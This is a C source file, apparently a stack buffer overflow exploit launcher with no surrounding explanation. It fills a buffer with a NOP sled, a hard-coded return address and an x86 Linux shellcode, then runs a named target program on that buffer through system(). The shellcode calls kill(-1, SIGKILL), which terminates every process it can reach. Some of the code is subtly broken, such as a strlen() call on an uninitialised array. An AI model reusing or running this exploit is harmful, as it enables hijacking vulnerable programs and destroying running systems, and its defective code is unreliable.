#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOP 0x90
#define DEFAULT_BUFFER_SIZE 1500
#define DEFAULT_RETURN_ADDRESS 0xbfdbac20

char shellcode[]="\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80";

int main(int argc, char *argv[])
{
	unsigned int return_address=DEFAULT_RETURN_ADDRESS;
	
	int buffer_size=DEFAULT_BUFFER_SIZE;
	int i;

	if(argc<2 || argc>4)
	{
		printf("Error, program call format is: %s <name_of_program> [buffer_size] [return_address]\n", argv[0]);
		return 1;
	}
	if(argc>=3)
		buffer_size=atoi(argv[2]);
	if(argc==4)
		return_address=atol(argv[3]);

	char *buff=(char *) malloc((buffer_size+1)*sizeof(char));
	bzero(buff, (buffer_size+1)*sizeof(char));

	unsigned int *addr_ptr=(unsigned int *) buff;
	for(i=0;i<buffer_size;i+=4)
		*(addr_ptr++)=return_address;
	for(i=0;i<(buffer_size/2)-(strlen(shellcode)/2);i++)
		buff[i]=NOP;

	char *buff_pointer=buff+i;
	for(i=0;i<strlen(shellcode);i++)
		*(buff_pointer++)=shellcode[i];

	char programCommand[buffer_size+2];
	memcpy(programCommand, buff, buffer_size+1);
	programCommand[buffer_size+1]='\0';
	strcat(programCommand, "\'");

	char spaces[4-(strlen(argv[1])-3)%4+1];
	for(i=0;i<4-(strlen(argv[1])-3)%4;i++)
		spaces[i]=' ';
	spaces[4-(strlen(argv[1])-3)%4]='\0';

	char program[strlen(argv[1])+strlen(spaces)+2];
	program[strlen(program)-1]='\0';
	sprintf(program, "%s%s\'", argv[1], spaces);

	memcpy(programCommand, program, strlen(program));
	system(programCommand);
	free(buff);

	return 0;
}
